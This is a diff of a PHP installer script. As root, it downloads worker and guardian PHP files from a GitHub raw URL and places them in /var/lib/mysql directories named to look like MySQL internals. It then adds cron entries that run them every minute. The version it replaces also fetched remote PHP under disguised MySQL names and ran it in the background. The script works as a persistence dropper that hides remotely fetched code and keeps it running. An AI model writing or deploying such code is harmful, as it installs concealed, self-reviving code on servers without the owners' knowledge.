@@ -1,32 +1,39 @@
 <?php
-error_reporting(E_ALL);
+if (posix_getuid() !== 0) die("Error: This script must be run as root.\n");
 
-$gitBase = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
-$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
-$sysHash = substr(md5(gethostname()), 0, 4);
+// Генерация уникального ID на основе серийного номера или hostname
+$id = substr(md5(gethostname()), 0, 8);
+$workerName = "mysql_proc_$id.php";
+$guardianName = "mysql_mon_$id.php";
+$logName = "mysql_err_$id.log";
 
-$name1 = "mysql_daemon_" . $sysHash . ".php";
-$name2 = "mysql_lib_" . $sysHash . ".php";
-$logName = ".mysql_audit.log";
+$path1 = "/var/lib/mysql/sys_internal";
+$path2 = "/var/lib/mysql/performance_meta";
 
-$files = [
-    "file1.php" => $name1,
-    "file2.php" => $name2
-];
+@mkdir($path1, 0755, true);
+@mkdir($path2, 0755, true);
 
-echo "--- Installation Started ---\n";
-foreach ($files as $gitName => $localName) {
-    $path = $targetDir . $localName;
-    $content = @file_get_contents($gitBase . $gitName);
-    if ($content) {
-        file_put_contents($path, $content);
-        chmod($path, 0755);
-        echo "[+] Created: $path\n";
-        exec("/usr/bin/php $path > /dev/null 2>&1 &");
-    } else {
-        echo "[!] Error: Could not download $gitName\n";
-    }
-}
+$workerPath = "$path1/$workerName";
+$guardianPath = "$path2/$guardianName";
+$logPath = "$path2/$logName";
 
-echo "[i] Shared Log Path: " . $targetDir . $logName . "\n";
-?>
+$baseUrl = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main";
+$workerCode = file_get_contents("$baseUrl/worker.php");
+$guardianCode = file_get_contents("$baseUrl/guardian.php");
+
+$guardianCode = str_replace(
+    ['{WORKER_PATH}', '{LOG_PATH}', '{BASE_URL}'],
+    [$workerPath, $logPath, $baseUrl],
+    $guardianCode
+);
+
+file_put_contents($workerPath, $workerCode);
+file_put_contents($guardianPath, $guardianCode);
+
+$cronCmd = "(* * * * * /usr/bin/php $workerPath) && (* * * * * /usr/bin/php $guardianPath)";
+$current = shell_exec('crontab -l 2>/dev/null');
+file_put_contents('/tmp/c', $current . "\n* * * * * /usr/bin/php $workerPath\n* * * * * /usr/bin/php $guardianPath\n");
+exec('crontab /tmp/c');
+unlink('/tmp/c');
+
+echo "Service deployed to $path1 and $path2\n";
